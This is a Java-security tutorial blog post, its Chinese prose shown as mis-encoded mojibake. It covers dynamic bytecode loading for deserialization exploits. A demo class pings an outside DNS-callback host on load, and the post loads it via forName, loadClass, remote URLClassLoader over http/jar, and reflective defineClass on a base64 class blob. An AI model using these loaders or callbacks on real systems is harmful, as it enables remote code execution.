---
layout: mypost
title: "åŠ¨æ€åŠ è½½å­—èŠ‚ç æŠ€æœ¯"
categories: [Javaå®‰å…¨]
---

## å‰è¨€

ä¸ƒä¸ƒå…«å…«ä¹Ÿå­¦äº†ä¸å°‘é“¾å­ï¼Œéƒ½æ˜¯å¾ˆå›ºå®šğŸ§·çš„å¥—è·¯`EntryClass-->gadget-->sink`ï¼Œç›®å‰sinkè¿™ä¸ªç‚¹è¿˜åªæ˜¯å•ä¸€çš„å‘½ä»¤æ‰§è¡Œï¼Œèƒ½åŠ›æ˜¯ååˆ†æœ‰é™çš„ï¼Œä¾‹å¦‚ç°åœ¨æœ‰éœ€è¦å›æ˜¾ï¼Œæ³¨å…¥å†…å­˜shellç­‰åœºæ™¯ï¼Œå•å‡­ä¸€ä¸ª`Runtime.getRuntime().exec("xxx");`å®ƒæ˜¯å¾ˆéš¾å»åšåˆ°çš„ï¼Œè€ŒåŠ¨æ€åŠ è½½å­—èŠ‚ç æŠ€æœ¯å°±æ˜¯æ¥è§£å†³è¿™ä¸ªé—®é¢˜çš„ï¼ŒæŠŠsinkèƒ½é€ æˆçš„å±å®³æ— é™æ‰©å¤§ã€‚

## è°ƒè¯•ä»£ç 

ä¼šé‡åˆ°ä¸€äº›æ–°åè¯ï¼Œä¾‹å¦‚`AppClassLoader`ã€`URLClassLoader`ã€`ClassLoader#defineClass`ç­‰ç­‰ï¼Œå†™å‡ ä¸ªdemoè°ƒè¯•ä¸€ä¸‹ï¼Œçœ‹çœ‹è¿™äº›æ–°åè¯çš„çœŸé¢ç›®ã€‚

1.é¦–å…ˆè¿˜æ˜¯å›åˆ°fornameå‡½æ•°ï¼Œå®ƒæ˜¯åŠ¨æ€ç±»åŠ è½½çš„ä¸€ç§å®ç°æ–¹å¼ã€‚

å†™ä¸€ä¸ªDNSç±»ï¼Œå¦‚ä¸‹-->

```java
import java.io.IOException;

public class DNS {
    static{
        try {
            Runtime.getRuntime().exec("ping 6y7d5.cxsys.spacestabs.top");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }
}
```

å†™ä¸€ä¸ªLoaderç±»å»åŠ è½½å®ƒ-->

```java
public class Loader {
    public static void main(String[] args) throws Exception {
        Class<?> clazz = Class.forName("DNS");
    }
}
```

æ­¤æ—¶æ‰§è¡Œmainå‡½æ•°åï¼Œå‘½ä»¤è¢«æˆåŠŸçš„æ‰§è¡Œï¼Œç»“æœå¦‚ä¸‹-->

![alt text](image-48.png)

åœ¨`Class<?> clazz = Class.forName("DNS");`å¤„ä¸‹æ–­ç‚¹è°ƒè¯•ï¼Œè·Ÿåˆ°forNameå‡½æ•°é‡Œé¢å®ƒå®é™…ä¸Šæ˜¯å»ç»§ç»­è°ƒç”¨äº†forName0å‡½æ•°

![alt text](image-109.png)

å®ƒå››ä¸ªå‚æ•°ï¼šclassNameåªæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ã€trueä»£è¡¨è¯¥ç±»è¦åˆå§‹åŒ–ã€å‰©ä¸‹ä¸¤ä¸ªå‚æ•°å…¨å’Œcalleræœ‰å…³ï¼Œå®ƒçš„å…·ä½“ä¿¡æ¯å¦‚ä¸‹-->

![alt text](image-110.png)

è€Œ`ClassLoader.getClassLoader(caller)`çš„è¿”å›å€¼å°±æ˜¯ä¸Šå›¾ä¸­æ¡†ä¸­çš„`Launcher$AppClassLoader`ï¼Œå®ƒæ˜¯`Launcher`ç±»çš„ä¸€ä¸ªå†…éƒ¨ç±»ã€‚ç°åœ¨å°†å®ƒæåˆ°å‡½æ•°å¤–ï¼Œç”¨fornameçš„å¦ä¸€ä¸ªé‡è½½å‡½æ•°å»åŠ è½½DNSç±»ï¼Œå¦‚ä¸‹-->

```java
public class Loader {
    public static void main(String[] args) throws Exception {
        ClassLoader loader = Loader.class.getClassLoader();
        Class<?> clazz = Class.forName("DNS", true, loader);
    }
}
```

Tipsï¼š`Loader.class.getClassLoader();`çš„ç»“æœå°±æ˜¯`Launcher$AppClassLoader`ï¼ŒAppClassLoader(åº”ç”¨ç¨‹åºç±»åŠ è½½å™¨)æ˜¯é¢å‘ç”¨æˆ·çš„åŠ è½½å™¨ï¼Œè´Ÿè´£åŠ è½½å½“å‰åº”ç”¨ classpath ä¸‹çš„æ‰€æœ‰ jar åŒ…å’Œç±»ã€‚

è¯´åˆ°åº•fornameå‡½æ•°å…¶ä¸­è¿˜æ˜¯ä¸»è¦é è¿™ä¸ªClassLoaderï¼Œç±»çš„åŠ è½½ä¸»è¦é çš„æ˜¯ClassLoaderï¼Œå½“ç„¶å¯ä»¥ç”¨fornameå»åŠ è½½ä¸€ä¸ªæ¶æ„ç±»ï¼Œä½†fornameå®åœ¨æ˜¯è¢«å°è£…çš„å¤ªå¤šäº†ï¼ˆå°è£…çš„è¶Šå¤šã€åŠŸèƒ½è¶Šç²¾ç¡®ã€æ¼æ´åˆ©ç”¨çš„å¯èƒ½æ€§åè€Œä¼šé™ä½ï¼‰ï¼ŒçœŸå®æƒ…å†µä¸‹æ€ä¹ˆå¯èƒ½è¢«å½“ä½œä¸€ä¸ªsinkï¼Ÿæ¥ä¸‹æ¥å°†demoå†™çš„æ›´åº•å±‚ä¸€ç‚¹ã€‚

2.åˆ©ç”¨ClassLoader.loadClass()å‡½æ•°å»åŠ è½½DNSç±»ï¼Œå¦‚ä¸‹-->

```java
public class Loader {
    public static void main(String[] args) throws Exception {
        ClassLoader loader = Loader.class.getClassLoader();
        loader.loadClass("DNS");
    }
}
```

æ­¤æ—¶æ‰§è¡Œmainå‡½æ•°åï¼Œå‘½ä»¤æ²¡æœ‰è¢«æˆåŠŸæ‰§è¡Œï¼Œè¯æ˜ç”¨ClassLoader.loadClass()å»åŠ è½½ä¸€ä¸ªç±»ï¼Œå®ƒé»˜è®¤æ˜¯ä¸ä¼šå»åˆå§‹åŒ–è¿™ä¸ªç±»çš„ï¼Œç›¸å½“äº`Class<?> clazz = Class.forName("DNS", false, loader);`ï¼Œå¾—æ˜¾å¼åœ°è°ƒç”¨å…¶æ„é€ 
å‡½æ•°ï¼Œåˆå§‹åŒ–ä»£ç æ‰èƒ½è¢«æ‰§è¡Œï¼Œå¦‚ä¸‹-->

```java
public class Loader {
    public static void main(String[] args) throws Exception {
        ClassLoader loader = Loader.class.getClassLoader();
        Class<?> dns = loader.loadClass("DNS");
        dns.newInstance();
    }
}
```

ä¸‹æ–­ç‚¹è°ƒè¯•ä¸€ä¸‹ï¼Œè·Ÿåˆ°loadClasså‡½æ•°ï¼Œç”±äºloaderæ˜¯`Launcher$AppClassLoader`ï¼Œæ‰€ä»¥åœ¨ç»å†äº†loadClasså‡½æ•°çš„åˆå§‹åŒ–åï¼Œä¼šè¿›å…¥åˆ°`Launcher$AppClassLoader.loadClass`å‡½æ•°ï¼Œå¦‚ä¸‹-->

![alt text](image-111.png)

è€Œ`Launcher$AppClassLoader.loadClass`æœ€åè¿˜æ˜¯å»è°ƒç”¨äº†å®ƒçˆ¶ç±»URLClassLoaderçš„loadClasså‡½æ•°ï¼Œå¦‚ä¸‹-->

![alt text](image-112.png)

çˆ¶ç±»çš„å†…éƒ¨ç±»FactoryURLClassLoaderæœ‰ä¸€ä¸ªloadClassï¼Œçˆ¶ç±»å¹¶æ²¡æœ‰loadClasså‡½æ•°ï¼Œæ‰€ä»¥ä¼šå»URLClassLoaderçš„çˆ¶ç±»SecureClassLoaderå»æ‰¾loadClasså‡½æ•°ï¼Œå®ƒåŒæ ·æ²¡æœ‰ï¼Œå†å»SecureClassLoaderçš„çˆ¶ç±»ClassLoaderå»æ‰¾ï¼Œæœ€ç»ˆè°ƒç”¨åˆ°äº†`ClassLoader.loadClass`å‡½æ•°ï¼Œå¦‚ä¸‹-->

![alt text](image-113.png)

è€Œ`ClassLoader.loadClass`å‡½æ•°çš„å†…éƒ¨é€»è¾‘æ˜¯åŒäº²å§”æ´¾æ¨¡å‹ï¼Œä¸Šæ–‡æåˆ°çš„AppClassLoaderå°±æ˜¯åŒäº²å§”æ´¾æ¨¡å‹ä¸­çš„ä¸€ç§ç±»åŠ è½½å™¨ï¼ŒåŒæ ·çš„è¿˜æœ‰ä¸¤ç§ç±»åŠ è½½å™¨åˆ†åˆ«æ˜¯ï¼šExtensionClassLoaderã€BootstrapClassLoaderã€‚é™¤äº†è¿™ä¸‰ç§ç±»åŠ è½½å™¨ä¹‹å¤–ï¼Œç”¨æˆ·è¿˜å¯ä»¥åŠ å…¥è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨æ¥è¿›è¡Œæ‹“å±•ï¼Œä»¥æ»¡è¶³è‡ªå·±çš„ç‰¹æ®Šéœ€æ±‚ã€‚å°±æ¯”å¦‚è¯´ï¼Œå¯ä»¥å¯¹ Java ç±»çš„å­—èŠ‚ç ï¼ˆ .class æ–‡ä»¶ï¼‰è¿›è¡ŒåŠ å¯†ï¼ŒåŠ è½½æ—¶å†åˆ©ç”¨è‡ªå®šä¹‰çš„ç±»åŠ è½½å™¨å¯¹å…¶è§£å¯†ã€‚ç±»åŠ è½½çš„å·¥ä½œè¿‡ç¨‹å¦‚ä¸‹-->

![alt text](image-114.png)

åœ¨åŒäº²å§”æ´¾æ¨¡å‹ä¸­ï¼Œä»£ç æ¥ä¸‹æ¥ä¼šä¸€å±‚å±‚çš„å‘ä¸Šæ‰¾ï¼Œä»AppClassLoaderåˆ°ExtensionClassLoaderåˆ°BootstrapClassLoaderï¼Œæ£€æŸ¥æ˜¯å¦åŠ è½½è¿‡DNSç±»ï¼Œç”±äºæ˜¯ç¬¬ä¸€æ¬¡è‚¯å®šæ˜¯æ²¡æœ‰è¢«åŠ è½½è¿‡çš„ï¼Œç„¶ååœ¨è‡ªä¸Šè€Œä¸‹çš„å°è¯•å»åŠ è½½ç±»ï¼Œç”±äºåœ¨demoä»£ç ä¸­ï¼ŒDNSç±»æ˜¯è‡ªå·±å®ç°çš„ç±»æ‰€ä»¥ä¼šåœ¨AppClassLoaderä¸­å»åŠ è½½è¿™ä¸ªç±»ï¼Œè§ä¸‹å›¾-->

![alt text](image-115.png)

Tipsï¼šä¸æ˜¯åœ¨AppClassLoaderä¸­å»å°è¯•åŠ è½½çš„ç±»å—ï¼Ÿä¸ºä½•ä¼šåœ¨URLClassLoaderä¸­å»å°è¯•åŠ è½½å‘¢ï¼Ÿå› ä¸ºAPPClassLoaderä¸­æ²¡æœ‰findClassè¿™ä¸ªå‡½æ•°ï¼Œè€ŒURLClassLoaderæ˜¯å®ƒçš„çˆ¶ç±»ï¼Œæ‰€ä»¥ä¾¿åˆ°äº†URLClassLoaderçš„findClasså‡½æ•°ï¼Œå»å‘ç°ç±»å¹¶å°è¯•åŠ è½½ç±»ã€‚å…¶å®ExtensionClassLoaderä¹Ÿæ˜¯ä¸€æ ·çš„ï¼ŒåŒæ ·æ˜¯èµ°çš„URLClassLoaderçš„findClasså‡½æ•°ï¼Œåªä¸è¿‡å®ƒçš„`Resource res = ucp.getResource(path, false);`è¿™ä¸€è¡Œä»£ç è¿è¡Œç»“æœä¸ºnullï¼ŒAppClassLoaderçš„è¿è¡Œç»“æœä¸ä¸ºnullã€‚

æ¥ç€å°±æ˜¯åˆ°URLClassLoaderç±»çš„`defineClass(name, res);`å‡½æ•°ä¸­-->

![alt text](image-116.png)

è€Œå®ƒçš„æœ€åä¼šè°ƒç”¨ä¸€ä¸ªé‡è½½çš„defineClasså‡½æ•°ï¼Œä¹Ÿå°±æ˜¯å®ƒçˆ¶ç±»çš„defineClasså‡½æ•°å¦‚ä¸‹-->

![alt text](image-117.png)

è€ŒSecureClassLoaderç±»åˆä¼šè°ƒç”¨åˆ°å®ƒçˆ¶ç±»ClassLoaderçš„defineClasså‡½æ•°ï¼Œå¦‚ä¸‹-->

![alt text](image-118.png)

æœ€ç»ˆå»è°ƒç”¨äº†defineClass1å‡½æ•°ï¼Œå®ƒæ˜¯ä¸€ä¸ªnativeçš„æ–¹æ³•ï¼Œæ•´ä¸ªè°ƒç”¨æ ˆå¦‚ä¸‹-->

![alt text](image-119.png)

è‡³æ­¤DNSç±»åŠ è½½å®Œæˆï¼

## å–å…¶ç²¾å

è°ƒè¯•loadClasså‡½æ•°çš„æ•´ä¸ªè¿‡ç¨‹è´¹äº†ä¸å°‘åŠŸå¤«ï¼Œæ¢³ç†ä¸€ä¸‹å…¶ä¸­çš„å…³ç³»-->

![alt text](image-120.png)

å…¶ä¸­ç²¾åå°±æ˜¯å…³é”®çš„ä¸‰ä¸ªå‡½æ•°ï¼ŒloadClasså‡½æ•°ã€findClasså‡½æ•°ã€defineClasså‡½æ•°ï¼Œä¸Šè¿°demoå·²ç»ç”¨loadClasså‡½æ•°å»åŠ è½½äº†DNSç±»ï¼Œé™¤äº†å®ƒå½“ç„¶è¿˜å¯ä»¥ç”¨å…¶ä»–ä¸¤ä¸ªå‡½æ•°å»åŠ è½½ç±»-->åˆ©ç”¨URLClassLoaderåŠ è½½è¿œç¨‹classæ–‡ä»¶å’Œåˆ©ç”¨ClassLoader#defineClassç›´æ¥åŠ è½½å­—èŠ‚ç ã€‚

## åˆ©ç”¨URLClassLoaderåŠ è½½è¿œç¨‹classæ–‡ä»¶

URLClassLoaderçš„findClasså‡½æ•°ä¸èƒ½ç›´æ¥è°ƒç”¨ï¼Œåªèƒ½é€šè¿‡loadClasså‡½æ•°å»åŠ è½½ï¼Œæ­¤æ—¶ä¸ä»…ä»…æ˜¯å¯ä»¥åŠ è½½æœ¬åœ°è·¯å¾„çš„ç±»ï¼Œè¿˜å¯ä»¥é€šè¿‡åè®®å»è¿œç¨‹åŠ è½½ç±»ã€‚

1.file åè®®åŠ è½½classæ–‡ä»¶ï¼Œä»£ç å¦‚ä¸‹-->

```java
import java.net.URL;
import java.net.URLClassLoader;

public class Loader {
    public static void main(String[] args) throws Exception {
        URL[] urls = {new URL("file:///E:\\")};
        URLClassLoader urlClassLoader = new URLClassLoader(urls);
        Class c = urlClassLoader.loadClass("DNS");
        c.newInstance();
    }
}
```

2.HTTP åè®®åŠ è½½classæ–‡ä»¶ï¼Œå…¶ä¸­åœ¨Eç›˜æ ¹ç›®å½•ç”¨pythonèµ·ä¸€ä¸ªhttpæœåŠ¡å³å¯ï¼Œä»£ç å¦‚ä¸‹-->

```java
import java.net.URL;
import java.net.URLClassLoader;

public class Loader {
    public static void main(String[] args) throws Exception {
        URL[] urls = {new URL("http://localhost:8000/")};
        URLClassLoader urlClassLoader = new URLClassLoader(urls);
        Class c = urlClassLoader.loadClass("DNS");
        c.newInstance();
    }
}
```

3.file+jar åè®®ï¼Œåœ¨åŸç›®å½•è¿è¡Œ`jar -cvf DNS.jar DNS.class`ï¼Œæ¥ç€å¤åˆ¶åˆ°Eç›˜ï¼Œä¹¦å†™ä¸€ä¸ªLoaderç±»å»åŠ è½½ï¼Œä»£ç å¦‚ä¸‹-->

```java
import java.net.URL;
import java.net.URLClassLoader;

public class Loader {
    public static void main(String[] args) throws Exception {
        URL[] urls = {new URL("jar:file:///E:\\DNS.jar!/")};
        URLClassLoader urlClassLoader = new URLClassLoader(urls);
        Class c = urlClassLoader.loadClass("DNS");
        c.newInstance();
    }
}
```

4.åŒæ ·çš„HTTP + jar åè®®ï¼Œä»£ç å¦‚ä¸‹-->

```java
import java.net.URL;
import java.net.URLClassLoader;

public class Loader {
    public static void main(String[] args) throws Exception {
        URL[] urls = {new URL("jar:http://localhost:8000/DNS.jar!/")};
        URLClassLoader urlClassLoader = new URLClassLoader(urls);
        Class c = urlClassLoader.loadClass("DNS");
        c.newInstance();
    }
}
```

ä»¥ä¸Šçš„å››ä¸ªdemoå‡å¯ä»¥è§¦å‘DNSè¯·æ±‚ï¼Œå¦‚ä¸‹-->

![alt text](image-48.png)

æœ€å¥½ç”¨çš„è‚¯å®šæ˜¯ Http åè®®çš„åŠ è½½ï¼Œå¦‚æœèƒ½å¤Ÿæ§åˆ¶ç›®æ ‡Java ClassLoaderçš„åŸºç¡€è·¯å¾„ä¸ºä¸€ä¸ªhttpæœåŠ¡å™¨ï¼Œåˆ™å¯ä»¥åˆ©
ç”¨è¿œç¨‹åŠ è½½çš„æ–¹å¼æ‰§è¡Œä»»æ„ä»£ç ï¼

## åˆ©ç”¨ClassLoader#defineClassç›´æ¥åŠ è½½å­—èŠ‚ç 

çœ‹defineClasså‡½æ•°çš„å‚æ•°ï¼Œnameä¸ºç±»åï¼Œbä¸ºå­—èŠ‚ç æ•°ç»„ï¼Œoffä¸ºåç§»é‡ï¼Œlenä¸ºå­—èŠ‚ç æ•°ç»„çš„é•¿åº¦ï¼Œè¯¦æƒ…ğŸ”å¦‚ä¸‹-->

![alt text](image-121.png)

ClassLoaderæ˜¯æŠ½è±¡ç±»ï¼Œæ²¡æœ‰åŠæ³•å®ä¾‹åŒ–ï¼Œæ‰€ä»¥åªèƒ½ç”¨å®ƒçš„å­ç±»æ¥å®ä¾‹åŒ–ï¼Œè¿™é‡Œç”¨AppClassLoaderæ¥å®ä¾‹åŒ–ã€‚defineClassæ˜¯privateçš„ï¼Œåˆ™åªèƒ½åå°„è°ƒç”¨ã€‚ä»£ç å¦‚ä¸‹-->

```java
import java.lang.reflect.Method;
import java.util.Base64;

public class Loader {
    public static void main(String[] args) throws Exception {
        ClassLoader appClassLoader = Loader.class.getClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod(
                "defineClass",
                String.class,
                byte[].class,
                int.class,
                int.class
        );
        defineClass.setAccessible(true);
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAKAoACQAYCgAZABoIABsKABkAHAcAHQcAHgoABgAfBwAgBwAhAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAVMRE5TOwEACDxjbGluaXQ+AQABZQEAFUxqYXZhL2lvL0lPRXhjZXB0aW9uOwEADVN0YWNrTWFwVGFibGUHAB0BAApTb3VyY2VGaWxlAQAIRE5TLmphdmEMAAoACwcAIgwAIwAkAQAfcGluZyA2eTdkNS5jeHN5cy5zcGFjZXN0YWJzLnRvcAwAJQAmAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAGmphdmEvbGFuZy9SdW50aW1lRXhjZXB0aW9uDAAKACcBAANETlMBABBqYXZhL2xhbmcvT2JqZWN0AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAGChMamF2YS9sYW5nL1Rocm93YWJsZTspVgAhAAgACQAAAAAAAgABAAoACwABAAwAAAAvAAEAAQAAAAUqtwABsQAAAAIADQAAAAYAAQAAAAMADgAAAAwAAQAAAAUADwAQAAAACAARAAsAAQAMAAAAZgADAAEAAAAXuAACEgO2AARXpwANS7sABlkqtwAHv7EAAQAAAAkADAAFAAMADQAAABYABQAAAAYACQAJAAwABwANAAgAFgAKAA4AAAAMAAEADQAJABIAEwAAABQAAAAHAAJMBwAVCQABABYAAAACABc=");
        Class hello = (Class)defineClass.invoke(appClassLoader, "DNS", code, 0, code.length);
        hello.newInstance();
    }
}
```

Tipsï¼šå…¶ä¸­codeçš„æ•°æ®å¯ä»¥ç”¨`cat DNS.class | base64`æ¥ç”Ÿæˆã€‚

æˆåŠŸè§¦å‘DNSè¯·æ±‚ï¼Œå¦‚ä¸‹-->

![alt text](image-48.png)

è‡³æ­¤ï¼ŒåŠ¨æ€åŠ è½½å­—èŠ‚ç æŠ€æœ¯å®Œæ¯•ï¼